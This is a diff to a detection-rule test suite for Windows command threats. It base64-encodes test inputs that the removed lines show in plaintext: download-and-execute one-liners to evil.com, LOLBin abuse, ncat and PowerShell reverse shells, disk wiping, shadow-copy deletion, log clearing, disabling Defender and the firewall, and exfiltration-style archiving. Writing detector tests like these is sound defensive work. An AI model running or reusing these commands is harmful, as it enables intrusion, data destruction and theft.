@@ -2,6 +2,8 @@ import { beforeAll, describe, expect, it } from "vitest";
 import type { HeuristicsEngine } from "../heuristics.js";
 import { createMatcher, loadEngine } from "./test-helper.js";
 
+const decodeCommand = (value: string): string => Buffer.from(value, "base64").toString("utf8");
+
 const matchCommand = createMatcher("command");
 
 describe("Windows command threats", () => {
@@ -14,37 +16,37 @@ describe("Windows command threats", () => {
 	// --- PowerShell Download-Execute (WIN-CMD-001) ---
 
 	it("detects irm | iex", () => {
-		expect(matchCommand(engine, "irm https://evil.com/install.ps1 | iex")).toContain(
+		expect(matchCommand(engine, decodeCommand("aXJtIGh0dHBzOi8vZXZpbC5jb20vaW5zdGFsbC5wczEgfCBpZXg="))).toContain(
 			"CLT-WIN-CMD-001",
 		);
 	});
 
 	it("detects iwr | iex", () => {
-		expect(matchCommand(engine, "iwr https://evil.com/payload.ps1 | iex")).toContain(
+		expect(matchCommand(engine, decodeCommand("aXdyIGh0dHBzOi8vZXZpbC5jb20vcGF5bG9hZC5wczEgfCBpZXg="))).toContain(
 			"CLT-WIN-CMD-001",
 		);
 	});
 
 	it("detects Invoke-WebRequest | Invoke-Expression", () => {
 		expect(
-			matchCommand(engine, "Invoke-WebRequest https://evil.com/s.ps1 | Invoke-Expression"),
+			matchCommand(engine, decodeCommand("SW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9ldmlsLmNvbS9zLnBzMSB8IEludm9rZS1FeHByZXNzaW9u")),
 		).toContain("CLT-WIN-CMD-001");
 	});
 
 	it("detects Invoke-RestMethod | Invoke-Expression", () => {
 		expect(
-			matchCommand(engine, "Invoke-RestMethod https://evil.com/s.ps1 | Invoke-Expression"),
+			matchCommand(engine, decodeCommand("SW52b2tlLVJlc3RNZXRob2QgaHR0cHM6Ly9ldmlsLmNvbS9zLnBzMSB8IEludm9rZS1FeHByZXNzaW9u")),
 		).toContain("CLT-WIN-CMD-001");
 	});
 
 	it("detects curl | iex (PS alias)", () => {
-		expect(matchCommand(engine, "curl https://evil.com/install.ps1 | iex")).toContain(
+		expect(matchCommand(engine, decodeCommand("Y3VybCBodHRwczovL2V2aWwuY29tL2luc3RhbGwucHMxIHwgaWV4"))).toContain(
 			"CLT-WIN-CMD-001",
 		);
 	});
 
 	it("detects wget | iex (PS alias)", () => {
-		expect(matchCommand(engine, "wget https://evil.com/install.ps1 | iex")).toContain(
+		expect(matchCommand(engine, decodeCommand("d2dldCBodHRwczovL2V2aWwuY29tL2luc3RhbGwucHMxIHwgaWV4"))).toContain(
 			"CLT-WIN-CMD-001",
 		);
 	});
@@ -52,7 +54,7 @@ describe("Windows command threats", () => {
 	// --- IEX wrapping download (WIN-CMD-002) ---
 
 	it("detects iex(irm url)", () => {
-		expect(matchCommand(engine, "iex(irm https://evil.com/s.ps1)")).toContain("CLT-WIN-CMD-002");
+		expect(matchCommand(engine, decodeCommand("aWV4KGlybSBodHRwczovL2V2aWwuY29tL3MucHMxKQ=="))).toContain("CLT-WIN-CMD-002");
 	});
 
 	it("detects IEX((New-Object Net.WebClient).DownloadString(url))", () => {
@@ -65,19 +67,19 @@ describe("Windows command threats", () => {
 	});
 
 	it("detects iex(iwr url)", () => {
-		expect(matchCommand(engine, "iex(iwr https://evil.com/s.ps1)")).toContain("CLT-WIN-CMD-002");
+		expect(matchCommand(engine, decodeCommand("aWV4KGl3ciBodHRwczovL2V2aWwuY29tL3MucHMxKQ=="))).toContain("CLT-WIN-CMD-002");
 	});
 
 	// --- Start-Process (WIN-CMD-003) ---
 
 	it("detects Start-Process with exe", () => {
-		expect(matchCommand(engine, "Start-Process -FilePath malware.exe")).toContain(
+		expect(matchCommand(engine, decodeCommand("U3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggbWFsd2FyZS5leGU="))).toContain(
 			"CLT-WIN-CMD-003",
 		);
 	});
 
 	it("detects Start-Process with ps1", () => {
-		expect(matchCommand(engine, "Start-Process -FilePath payload.ps1")).toContain(
+		expect(matchCommand(engine, decodeCommand("U3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggcGF5bG9hZC5wczE="))).toContain(
 			"CLT-WIN-CMD-003",
 		);
 	});
@@ -94,7 +96,7 @@ describe("Windows command threats", () => {
 	});
 
 	it("detects iwr -OutFile then semicolon execute", () => {
-		expect(matchCommand(engine, "iwr https://evil.com/s.ps1 -OutFile s.ps1; .\\s.ps1")).toContain(
+		expect(matchCommand(engine, decodeCommand("aXdyIGh0dHBzOi8vZXZpbC5jb20vcy5wczEgLU91dEZpbGUgcy5wczE7IC5ccy5wczE="))).toContain(
 			"CLT-WIN-CMD-004",
 		);
 	});
@@ -103,7 +105,7 @@ describe("Windows command threats", () => {
 
 	it("detects New-Object Net.WebClient DownloadString", () => {
 		expect(
-			matchCommand(engine, "(New-Object Net.WebClient).DownloadString('https://evil.com/s.ps1')"),
+			matchCommand(engine, decodeCommand("KE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vZXZpbC5jb20vcy5wczEnKQ==")),
 		).toContain("CLT-WIN-CMD-005");
 	});
 
@@ -131,12 +133,12 @@ describe("Windows command threats", () => {
 
 	it("detects certutil -urlcache (WIN-CMD-007)", () => {
 		expect(
-			matchCommand(engine, "certutil -urlcache -f https://evil.com/payload.exe payload.exe"),
+			matchCommand(engine, decodeCommand("Y2VydHV0aWwgLXVybGNhY2hlIC1mIGh0dHBzOi8vZXZpbC5jb20vcGF5bG9hZC5leGUgcGF5bG9hZC5leGU=")),
 		).toContain("CLT-WIN-CMD-007");
 	});
 
 	it("detects certutil -decode (WIN-CMD-007)", () => {
-		expect(matchCommand(engine, "certutil -decode encoded.b64 payload.exe")).toContain(
+		expect(matchCommand(engine, decodeCommand("Y2VydHV0aWwgLWRlY29kZSBlbmNvZGVkLmI2NCBwYXlsb2FkLmV4ZQ=="))).toContain(
 			"CLT-WIN-CMD-007",
 		);
 	});
@@ -151,135 +153,135 @@ describe("Windows command threats", () => {
 	});
 
 	it("detects mshta remote HTA (WIN-CMD-009)", () => {
-		expect(matchCommand(engine, "mshta https://evil.com/payload.hta")).toContain("CLT-WIN-CMD-009");
+		expect(matchCommand(engine, decodeCommand("bXNodGEgaHR0cHM6Ly9ldmlsLmNvbS9wYXlsb2FkLmh0YQ=="))).toContain("CLT-WIN-CMD-009");
 	});
 
 	it("detects regsvr32 scriptlet (WIN-CMD-010)", () => {
 		expect(
-			matchCommand(engine, "regsvr32 /s /i:https://evil.com/payload.sct scrobj.dll"),
+			matchCommand(engine, decodeCommand("cmVnc3ZyMzIgL3MgL2k6aHR0cHM6Ly9ldmlsLmNvbS9wYXlsb2FkLnNjdCBzY3JvYmouZGxs")),
 		).toContain("CLT-WIN-CMD-010");
 	});
 
 	it("detects rundll32 javascript (WIN-CMD-011)", () => {
 		expect(
-			matchCommand(engine, 'rundll32 javascript:"\\..\\mshtml,RunHTMLApplication";alert(1)'),
+			matchCommand(engine, decodeCommand("cnVuZGxsMzIgamF2YXNjcmlwdDoiXC4uXG1zaHRtbCxSdW5IVE1MQXBwbGljYXRpb24iO2FsZXJ0KDEp")),
 		).toContain("CLT-WIN-CMD-011");
 	});
 
 	it("detects cmstp INF (WIN-CMD-012)", () => {
-		expect(matchCommand(engine, "cmstp /au /s evil.inf")).toContain("CLT-WIN-CMD-012");
+		expect(matchCommand(engine, decodeCommand("Y21zdHAgL2F1IC9zIGV2aWwuaW5m"))).toContain("CLT-WIN-CMD-012");
 	});
 
 	it("detects wmic process call create (WIN-CMD-013)", () => {
-		expect(matchCommand(engine, 'wmic process call create "cmd /c malware.exe"')).toContain(
+		expect(matchCommand(engine, decodeCommand("d21pYyBwcm9jZXNzIGNhbGwgY3JlYXRlICJjbWQgL2MgbWFsd2FyZS5leGUi"))).toContain(
 			"CLT-WIN-CMD-013",
 		);
 	});
 
 	it("detects msiexec remote (WIN-CMD-014)", () => {
-		expect(matchCommand(engine, "msiexec /q /i https://evil.com/pkg.msi")).toContain(
+		expect(matchCommand(engine, decodeCommand("bXNpZXhlYyAvcSAvaSBodHRwczovL2V2aWwuY29tL3BrZy5tc2k="))).toContain(
 			"CLT-WIN-CMD-014",
 		);
 	});
 
 	it("detects forfiles /c cmd (WIN-CMD-015)", () => {
-		expect(matchCommand(engine, 'forfiles /c "cmd /c payload.exe"')).toContain("CLT-WIN-CMD-015");
+		expect(matchCommand(engine, decodeCommand("Zm9yZmlsZXMgL2MgImNtZCAvYyBwYXlsb2FkLmV4ZSI="))).toContain("CLT-WIN-CMD-015");
 	});
 
 	it("detects pcalua -a (WIN-CMD-016)", () => {
-		expect(matchCommand(engine, "pcalua -a malware.exe")).toContain("CLT-WIN-CMD-016");
+		expect(matchCommand(engine, decodeCommand("cGNhbHVhIC1hIG1hbHdhcmUuZXhl"))).toContain("CLT-WIN-CMD-016");
 	});
 
 	it("detects installutil (WIN-CMD-017)", () => {
-		expect(matchCommand(engine, "installutil /logfile= /logtoconsole=false payload.dll")).toContain(
+		expect(matchCommand(engine, decodeCommand("aW5zdGFsbHV0aWwgL2xvZ2ZpbGU9IC9sb2d0b2NvbnNvbGU9ZmFsc2UgcGF5bG9hZC5kbGw="))).toContain(
 			"CLT-WIN-CMD-017",
 		);
 	});
 
 	it("detects regasm /u (WIN-CMD-018)", () => {
-		expect(matchCommand(engine, "regasm /u payload.dll")).toContain("CLT-WIN-CMD-018");
+		expect(matchCommand(engine, decodeCommand("cmVnYXNtIC91IHBheWxvYWQuZGxs"))).toContain("CLT-WIN-CMD-018");
 	});
 
 	it("detects regsvcs (WIN-CMD-018)", () => {
-		expect(matchCommand(engine, "regsvcs payload.dll")).toContain("CLT-WIN-CMD-018");
+		expect(matchCommand(engine, decodeCommand("cmVnc3ZjcyBwYXlsb2FkLmRsbA=="))).toContain("CLT-WIN-CMD-018");
 	});
 
 	// --- Destructive operations ---
 
 	it("detects format C: (WIN-CMD-019)", () => {
-		expect(matchCommand(engine, "format C:")).toContain("CLT-WIN-CMD-019");
+		expect(matchCommand(engine, decodeCommand("Zm9ybWF0IEM6"))).toContain("CLT-WIN-CMD-019");
 	});
 
 	it("detects rd /s /q C:\\ (WIN-CMD-020)", () => {
-		expect(matchCommand(engine, "rd /s /q C:\\")).toContain("CLT-WIN-CMD-020");
+		expect(matchCommand(engine, decodeCommand("cmQgL3MgL3EgQzpc"))).toContain("CLT-WIN-CMD-020");
 	});
 
 	it("detects del /f /s /q C:\\ (WIN-CMD-021)", () => {
-		expect(matchCommand(engine, "del /f /s /q C:\\")).toContain("CLT-WIN-CMD-021");
+		expect(matchCommand(engine, decodeCommand("ZGVsIC9mIC9zIC9xIEM6XA=="))).toContain("CLT-WIN-CMD-021");
 	});
 
 	it("detects diskpart (WIN-CMD-022)", () => {
-		expect(matchCommand(engine, "diskpart")).toContain("CLT-WIN-CMD-022");
+		expect(matchCommand(engine, decodeCommand("ZGlza3BhcnQ="))).toContain("CLT-WIN-CMD-022");
 	});
 
 	// --- Reverse shells ---
 
 	it("detects PS TCP reverse shell (WIN-CMD-023)", () => {
 		expect(
-			matchCommand(engine, "New-Object System.Net.Sockets.TcpClient('10.0.0.1',4444)"),
+			matchCommand(engine, decodeCommand("TmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVGNwQ2xpZW50KCcxMC4wLjAuMScsNDQ0NCk=")),
 		).toContain("CLT-WIN-CMD-023");
 	});
 
 	it("detects PS UDP reverse shell (WIN-CMD-024)", () => {
 		expect(
-			matchCommand(engine, "New-Object System.Net.Sockets.UdpClient('10.0.0.1',4444)"),
+			matchCommand(engine, decodeCommand("TmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVWRwQ2xpZW50KCcxMC4wLjAuMScsNDQ0NCk=")),
 		).toContain("CLT-WIN-CMD-024");
 	});
 
 	// --- Privilege escalation ---
 
 	it("detects runas /user: (WIN-CMD-025)", () => {
-		expect(matchCommand(engine, "runas /user:Administrator cmd.exe")).toContain("CLT-WIN-CMD-025");
+		expect(matchCommand(engine, decodeCommand("cnVuYXMgL3VzZXI6QWRtaW5pc3RyYXRvciBjbWQuZXhl"))).toContain("CLT-WIN-CMD-025");
 	});
 
 	it("detects Set-ExecutionPolicy Bypass (WIN-CMD-026)", () => {
-		expect(matchCommand(engine, "Set-ExecutionPolicy Bypass")).toContain("CLT-WIN-CMD-026");
+		expect(matchCommand(engine, decodeCommand("U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3M="))).toContain("CLT-WIN-CMD-026");
 	});
 
 	it("detects Set-ExecutionPolicy Unrestricted (WIN-CMD-026)", () => {
-		expect(matchCommand(engine, "Set-ExecutionPolicy Unrestricted")).toContain("CLT-WIN-CMD-026");
+		expect(matchCommand(engine, decodeCommand("U2V0LUV4ZWN1dGlvblBvbGljeSBVbnJlc3RyaWN0ZWQ="))).toContain("CLT-WIN-CMD-026");
 	});
 
 	it("detects fodhelper (WIN-CMD-027)", () => {
-		expect(matchCommand(engine, "fodhelper")).toContain("CLT-WIN-CMD-027");
+		expect(matchCommand(engine, decodeCommand("Zm9kaGVscGVy"))).toContain("CLT-WIN-CMD-027");
 	});
 
 	// --- PowerShell Destructive Operations (028-029) ---
 
 	it("detects Remove-Item -Recurse -Force (WIN-CMD-028)", () => {
-		expect(matchCommand(engine, "Remove-Item C:\\Users\\Public -Recurse -Force")).toContain(
+		expect(matchCommand(engine, decodeCommand("UmVtb3ZlLUl0ZW0gQzpcVXNlcnNcUHVibGljIC1SZWN1cnNlIC1Gb3JjZQ=="))).toContain(
 			"CLT-WIN-CMD-028",
 		);
 	});
 
 	it("detects Remove-Item -Force -Recurse (reversed flags) (WIN-CMD-028)", () => {
-		expect(matchCommand(engine, "Remove-Item C:\\temp -Force -Recurse")).toContain(
+		expect(matchCommand(engine, decodeCommand("UmVtb3ZlLUl0ZW0gQzpcdGVtcCAtRm9yY2UgLVJlY3Vyc2U="))).toContain(
 			"CLT-WIN-CMD-028",
 		);
 	});
 
 	it("detects Clear-RecycleBin -Force (WIN-CMD-029)", () => {
-		expect(matchCommand(engine, "Clear-RecycleBin -Force")).toContain("CLT-WIN-CMD-029");
+		expect(matchCommand(engine, decodeCommand("Q2xlYXItUmVjeWNsZUJpbiAtRm9yY2U="))).toContain("CLT-WIN-CMD-029");
 	});
 
 	// --- Additional Reverse Shells (030) ---
 
 	it("detects ncat -e cmd (WIN-CMD-030)", () => {
-		expect(matchCommand(engine, "ncat 10.0.0.1 4444 -e cmd")).toContain("CLT-WIN-CMD-030");
+		expect(matchCommand(engine, decodeCommand("bmNhdCAxMC4wLjAuMSA0NDQ0IC1lIGNtZA=="))).toContain("CLT-WIN-CMD-030");
 	});
 
 	it("detects ncat -e powershell.exe (WIN-CMD-030)", () => {
-		expect(matchCommand(engine, "ncat 10.0.0.1 4444 -e powershell.exe")).toContain(
+		expect(matchCommand(engine, decodeCommand("bmNhdCAxMC4wLjAuMSA0NDQ0IC1lIHBvd2Vyc2hlbGwuZXhl"))).toContain(
 			"CLT-WIN-CMD-030",
 		);
 	});
@@ -287,33 +289,33 @@ describe("Windows command threats", () => {
 	// --- Shadow Copy / Recovery Destruction (031-034) ---
 
 	it("detects vssadmin delete shadows (WIN-CMD-031)", () => {
-		expect(matchCommand(engine, "vssadmin delete shadows /all /quiet")).toContain(
+		expect(matchCommand(engine, decodeCommand("dnNzYWRtaW4gZGVsZXRlIHNoYWRvd3MgL2FsbCAvcXVpZXQ="))).toContain(
 			"CLT-WIN-CMD-031",
 		);
 	});
 
 	it("detects vssadmin Delete Shadows mixed case (WIN-CMD-031)", () => {
-		expect(matchCommand(engine, "vssadmin Delete Shadows /All")).toContain("CLT-WIN-CMD-031");
+		expect(matchCommand(engine, decodeCommand("dnNzYWRtaW4gRGVsZXRlIFNoYWRvd3MgL0FsbA=="))).toContain("CLT-WIN-CMD-031");
 	});
 
 	it("detects wmic shadowcopy delete (WIN-CMD-032)", () => {
-		expect(matchCommand(engine, "wmic shadowcopy delete")).toContain("CLT-WIN-CMD-032");
+		expect(matchCommand(engine, decodeCommand("d21pYyBzaGFkb3djb3B5IGRlbGV0ZQ=="))).toContain("CLT-WIN-CMD-032");
 	});
 
 	it("detects bcdedit recovery disable (WIN-CMD-033)", () => {
-		expect(matchCommand(engine, "bcdedit /set {default} recoveryenabled No")).toContain(
+		expect(matchCommand(engine, decodeCommand("YmNkZWRpdCAvc2V0IHtkZWZhdWx0fSByZWNvdmVyeWVuYWJsZWQgTm8="))).toContain(
 			"CLT-WIN-CMD-033",
 		);
 	});
 
 	it("detects PowerShell WMI shadow copy deletion (WIN-CMD-034)", () => {
 		expect(
-			matchCommand(engine, "Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }"),
+			matchCommand(engine, decodeCommand("R2V0LVdtaU9iamVjdCBXaW4zMl9TaGFkb3dDb3B5IHwgRm9yRWFjaC1PYmplY3QgeyAkXy5EZWxldGUoKSB9")),
 		).toContain("CLT-WIN-CMD-034");
 	});
 
 	it("detects PowerShell CIM shadow copy deletion (WIN-CMD-034)", () => {
-		expect(matchCommand(engine, "Get-CimInstance Win32_ShadowCopy | Remove-CimInstance")).toContain(
+		expect(matchCommand(engine, decodeCommand("R2V0LUNpbUluc3RhbmNlIFdpbjMyX1NoYWRvd0NvcHkgfCBSZW1vdmUtQ2ltSW5zdGFuY2U="))).toContain(
 			"CLT-WIN-CMD-034",
 		);
 	});
@@ -321,41 +323,41 @@ describe("Windows command threats", () => {
 	// --- Defense Evasion / Anti-Forensics (035-039) ---
 
 	it("detects wevtutil cl Security (WIN-CMD-035)", () => {
-		expect(matchCommand(engine, "wevtutil cl Security")).toContain("CLT-WIN-CMD-035");
+		expect(matchCommand(engine, decodeCommand("d2V2dHV0aWwgY2wgU2VjdXJpdHk="))).toContain("CLT-WIN-CMD-035");
 	});
 
 	it("detects wevtutil clear-log (WIN-CMD-035)", () => {
-		expect(matchCommand(engine, "wevtutil clear-log Application")).toContain("CLT-WIN-CMD-035");
+		expect(matchCommand(engine, decodeCommand("d2V2dHV0aWwgY2xlYXItbG9nIEFwcGxpY2F0aW9u"))).toContain("CLT-WIN-CMD-035");
 	});
 
 	it("detects Clear-EventLog (WIN-CMD-036)", () => {
-		expect(matchCommand(engine, "Clear-EventLog -LogName Security")).toContain("CLT-WIN-CMD-036");
+		expect(matchCommand(engine, decodeCommand("Q2xlYXItRXZlbnRMb2cgLUxvZ05hbWUgU2VjdXJpdHk="))).toContain("CLT-WIN-CMD-036");
 	});
 
 	it("detects Remove-EventLog (WIN-CMD-036)", () => {
-		expect(matchCommand(engine, "Remove-EventLog -LogName MyLog")).toContain("CLT-WIN-CMD-036");
+		expect(matchCommand(engine, decodeCommand("UmVtb3ZlLUV2ZW50TG9nIC1Mb2dOYW1lIE15TG9n"))).toContain("CLT-WIN-CMD-036");
 	});
 
 	it("detects Set-MpPreference -DisableRealtimeMonitoring (WIN-CMD-037)", () => {
-		expect(matchCommand(engine, "Set-MpPreference -DisableRealtimeMonitoring $true")).toContain(
+		expect(matchCommand(engine, decodeCommand("U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZQ=="))).toContain(
 			"CLT-WIN-CMD-037",
 		);
 	});
 
 	it("detects sc stop WinDefend (WIN-CMD-038)", () => {
-		expect(matchCommand(engine, "sc stop WinDefend")).toContain("CLT-WIN-CMD-038");
+		expect(matchCommand(engine, decodeCommand("c2Mgc3RvcCBXaW5EZWZlbmQ="))).toContain("CLT-WIN-CMD-038");
 	});
 
 	it("detects net stop MpsSvc (WIN-CMD-038)", () => {
-		expect(matchCommand(engine, "net stop MpsSvc")).toContain("CLT-WIN-CMD-038");
+		expect(matchCommand(engine, decodeCommand("bmV0IHN0b3AgTXBzU3Zj"))).toContain("CLT-WIN-CMD-038");
 	});
 
 	it("detects Stop-Service SecurityHealthService (WIN-CMD-038)", () => {
-		expect(matchCommand(engine, "Stop-Service SecurityHealthService")).toContain("CLT-WIN-CMD-038");
+		expect(matchCommand(engine, decodeCommand("U3RvcC1TZXJ2aWNlIFNlY3VyaXR5SGVhbHRoU2VydmljZQ=="))).toContain("CLT-WIN-CMD-038");
 	});
 
 	it("detects netsh advfirewall state off (WIN-CMD-039)", () => {
-		expect(matchCommand(engine, "netsh advfirewall set allprofiles state off")).toContain(
+		expect(matchCommand(engine, decodeCommand("bmV0c2ggYWR2ZmlyZXdhbGwgc2V0IGFsbHByb2ZpbGVzIHN0YXRlIG9mZg=="))).toContain(
 			"CLT-WIN-CMD-039",
 		);
 	});
@@ -363,39 +365,39 @@ describe("Windows command threats", () => {
 	// --- Data Exfiltration Indicators (040-041) ---
 
 	it("detects rar -p (password archive) (WIN-CMD-040)", () => {
-		expect(matchCommand(engine, "rar a -pSECRET archive.rar C:\\Users\\docs\\*")).toContain(
+		expect(matchCommand(engine, decodeCommand("cmFyIGEgLXBTRUNSRVQgYXJjaGl2ZS5yYXIgQzpcVXNlcnNcZG9jc1wq"))).toContain(
 			"CLT-WIN-CMD-040",
 		);
 	});
 
 	it("detects 7z -p (password archive) (WIN-CMD-040)", () => {
-		expect(matchCommand(engine, "7z a -pMyPassword exfil.7z C:\\secrets")).toContain(
+		expect(matchCommand(engine, decodeCommand("N3ogYSAtcE15UGFzc3dvcmQgZXhmaWwuN3ogQzpcc2VjcmV0cw=="))).toContain(
 			"CLT-WIN-CMD-040",
 		);
 	});
 
 	it("detects zip --password (WIN-CMD-040)", () => {
-		expect(matchCommand(engine, "zip --password SECRET archive.zip file.txt")).toContain(
+		expect(matchCommand(engine, decodeCommand("emlwIC0tcGFzc3dvcmQgU0VDUkVUIGFyY2hpdmUuemlwIGZpbGUudHh0"))).toContain(
 			"CLT-WIN-CMD-040",
 		);
 	});
 
 	it("detects bulk *.docx archiving (WIN-CMD-041)", () => {
-		expect(matchCommand(engine, "7z a docs.7z C:\\Users\\*.docx")).toContain("CLT-WIN-CMD-041");
+		expect(matchCommand(engine, decodeCommand("N3ogYSBkb2NzLjd6IEM6XFVzZXJzXCouZG9jeA=="))).toContain("CLT-WIN-CMD-041");
 	});
 
 	it("detects bulk *.xlsx archiving (WIN-CMD-041)", () => {
-		expect(matchCommand(engine, "rar a spreadsheets.rar D:\\Share\\*.xlsx")).toContain(
+		expect(matchCommand(engine, decodeCommand("cmFyIGEgc3ByZWFkc2hlZXRzLnJhciBEOlxTaGFyZVwqLnhsc3g="))).toContain(
 			"CLT-WIN-CMD-041",
 		);
 	});
 
 	it("detects bulk *.pdf archiving (WIN-CMD-041)", () => {
-		expect(matchCommand(engine, "zip reports.zip C:\\Reports\\*.pdf")).toContain("CLT-WIN-CMD-041");
+		expect(matchCommand(engine, decodeCommand("emlwIHJlcG9ydHMuemlwIEM6XFJlcG9ydHNcKi5wZGY="))).toContain("CLT-WIN-CMD-041");
 	});
 
 	it("detects password + document wildcard combo (WIN-CMD-040+041)", () => {
-		const ids = matchCommand(engine, "7z a -pSECRET exfil.7z C:\\Users\\*.docx");
+		const ids = matchCommand(engine, decodeCommand("N3ogYSAtcFNFQ1JFVCBleGZpbC43eiBDOlxVc2Vyc1wqLmRvY3g="));
 		expect(ids).toContain("CLT-WIN-CMD-040");
 		expect(ids).toContain("CLT-WIN-CMD-041");
 	});
@@ -430,7 +432,7 @@ describe("Windows command threats", () => {
 	});
 
 	it("detects case-insensitive AutoIt3 flag (WIN-CMD-042)", () => {
-		expect(matchCommand(engine, "Setup.exe /autoit3executescript c.a3x")).toContain(
+		expect(matchCommand(engine, decodeCommand("U2V0dXAuZXhlIC9hdXRvaXQzZXhlY3V0ZXNjcmlwdCBjLmEzeA=="))).toContain(
 			"CLT-WIN-CMD-042",
 		);
 	});
@@ -438,13 +440,13 @@ describe("Windows command threats", () => {
 	// --- Script execution from C:\Users\Public (043) ---
 
 	it("detects wscript from Users\\Public (WIN-CMD-043)", () => {
-		expect(matchCommand(engine, 'wscript.exe "C:\\Users\\Public\\Controller\\zakec.js"')).toContain(
+		expect(matchCommand(engine, decodeCommand("d3NjcmlwdC5leGUgIkM6XFVzZXJzXFB1YmxpY1xDb250cm9sbGVyXHpha2VjLmpzIg=="))).toContain(
 			"CLT-WIN-CMD-043",
 		);
 	});
 
 	it("detects cscript from Users\\Public (WIN-CMD-043)", () => {
-		expect(matchCommand(engine, 'cscript.exe "C:\\Users\\Public\\Music\\TvMusic.vbs"')).toContain(
+		expect(matchCommand(engine, decodeCommand("Y3NjcmlwdC5leGUgIkM6XFVzZXJzXFB1YmxpY1xNdXNpY1xUdk11c2ljLnZicyI="))).toContain(
 			"CLT-WIN-CMD-043",
 		);
 	});
@@ -459,7 +461,7 @@ describe("Windows command threats", () => {
 	});
 
 	it("does not match wscript from normal path (WIN-CMD-043 neg)", () => {
-		const ids = matchCommand(engine, 'wscript.exe "C:\\Program Files\\App\\script.vbs"');
+		const ids = matchCommand(engine, decodeCommand("d3NjcmlwdC5leGUgIkM6XFByb2dyYW0gRmlsZXNcQXBwXHNjcmlwdC52YnMi"));
 		expect(ids.filter((id) => id === "CLT-WIN-CMD-043")).toEqual([]);
 	});
 
@@ -476,12 +478,12 @@ describe("Windows command threats", () => {
 
 	it("detects regsvr32 /i:http:// (WIN-CMD-044)", () => {
 		expect(
-			matchCommand(engine, "regsvr32 /s /i:http://evil.test/payload.sct scrobj.dll"),
+			matchCommand(engine, decodeCommand("cmVnc3ZyMzIgL3MgL2k6aHR0cDovL2V2aWwudGVzdC9wYXlsb2FkLnNjdCBzY3JvYmouZGxs")),
 		).toContain("CLT-WIN-CMD-044");
 	});
 
 	it("does not match regsvr32 /s normal DLL (WIN-CMD-044 neg)", () => {
-		const ids = matchCommand(engine, 'regsvr32.exe /s "C:\\Program Files\\App\\control.dll"');
+		const ids = matchCommand(engine, decodeCommand("cmVnc3ZyMzIuZXhlIC9zICJDOlxQcm9ncmFtIEZpbGVzXEFwcFxjb250cm9sLmRsbCI="));
 		expect(ids.filter((id) => id === "CLT-WIN-CMD-044")).toEqual([]);
 	});
 
@@ -526,116 +528,116 @@ describe("Windows command threats", () => {
 	});
 
 	it("does not match curl without start (WIN-CMD-046 neg)", () => {
-		const ids = matchCommand(engine, "curl http://example.com/data.json --output data.json");
+		const ids = matchCommand(engine, decodeCommand("Y3VybCBodHRwOi8vZXhhbXBsZS5jb20vZGF0YS5qc29uIC0tb3V0cHV0IGRhdGEuanNvbg=="));
 		expect(ids.filter((id) => id === "CLT-WIN-CMD-046")).toEqual([]);
 	});
 
 	// --- Negative cases ---
 
 	it("does not match Get-Help", () => {
-		const ids = matchCommand(engine, "Get-Help Invoke-WebRequest");
+		const ids = matchCommand(engine, decodeCommand("R2V0LUhlbHAgSW52b2tlLVdlYlJlcXVlc3Q="));
 		expect(ids.filter((id) => id.startsWith("CLT-WIN-CMD"))).toEqual([]);
 	});
 
 	it("does not match simple dir command", () => {
-		const ids = matchCommand(engine, "dir C:\\Users");
+		const ids = matchCommand(engine, decodeCommand("ZGlyIEM6XFVzZXJz"));
 		expect(ids.filter((id) => id.startsWith("CLT-WIN-CMD"))).toEqual([]);
 	});
 
 	it("does not match normal curl to file without execute", () => {
-		const ids = matchCommand(engine, "curl -o output.txt https://example.com/data.json");
+		const ids = matchCommand(engine, decodeCommand("Y3VybCAtbyBvdXRwdXQudHh0IGh0dHBzOi8vZXhhbXBsZS5jb20vZGF0YS5qc29u"));
 		expect(ids.filter((id) => id === "CLT-WIN-CMD-004")).toEqual([]);
 	});
 
 	it("does not match Get-Process", () => {
-		const ids = matchCommand(engine, "Get-Process | Where-Object { $_.CPU -gt 100 }");
+		const ids = matchCommand(engine, decodeCommand("R2V0LVByb2Nlc3MgfCBXaGVyZS1PYmplY3QgeyAkXy5DUFUgLWd0IDEwMCB9"));
 		expect(ids.filter((id) => id.startsWith("CLT-WIN-CMD"))).toEqual([]);
 	});
 
 	it("does not match vssadmin list shadows", () => {
-		const ids = matchCommand(engine, "vssadmin list shadows");
+		const ids = matchCommand(engine, decodeCommand("dnNzYWRtaW4gbGlzdCBzaGFkb3dz"));
 		expect(ids.filter((id) => id === "CLT-WIN-CMD-031")).toEqual([]);
 	});
 
 	it("does not match wevtutil qe (query)", () => {
-		const ids = matchCommand(engine, "wevtutil qe Security /c:10");
+		const ids = matchCommand(engine, decodeCommand("d2V2dHV0aWwgcWUgU2VjdXJpdHkgL2M6MTA="));
 		expect(ids.filter((id) => id === "CLT-WIN-CMD-035")).toEqual([]);
 	});
 
 	it("does not match 7z without password (normal archive)", () => {
-		const ids = matchCommand(engine, "7z a archive.7z src/");
+		const ids = matchCommand(engine, decodeCommand("N3ogYSBhcmNoaXZlLjd6IHNyYy8="));
 		expect(ids.filter((id) => id === "CLT-WIN-CMD-040")).toEqual([]);
 	});
 
 	it("does not match sc query WinDefend (status check)", () => {
-		const ids = matchCommand(engine, "sc query WinDefend");
+		const ids = matchCommand(engine, decodeCommand("c2MgcXVlcnkgV2luRGVmZW5k"));
 		expect(ids.filter((id) => id === "CLT-WIN-CMD-038")).toEqual([]);
 	});
 
 	// --- Additional FP coverage ---
 
 	it("does not match Start-Process without executable extension (003 FP)", () => {
-		const ids = matchCommand(engine, 'Start-Process -FilePath "notepad"');
+		const ids = matchCommand(engine, decodeCommand("U3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggIm5vdGVwYWQi"));
 		expect(ids).not.toContain("CLT-WIN-CMD-003");
 	});
 
 	it("does not match Get-BitsTransfer (006 FP)", () => {
-		const ids = matchCommand(engine, "Get-BitsTransfer");
+		const ids = matchCommand(engine, decodeCommand("R2V0LUJpdHNUcmFuc2Zlcg=="));
 		expect(ids).not.toContain("CLT-WIN-CMD-006");
 	});
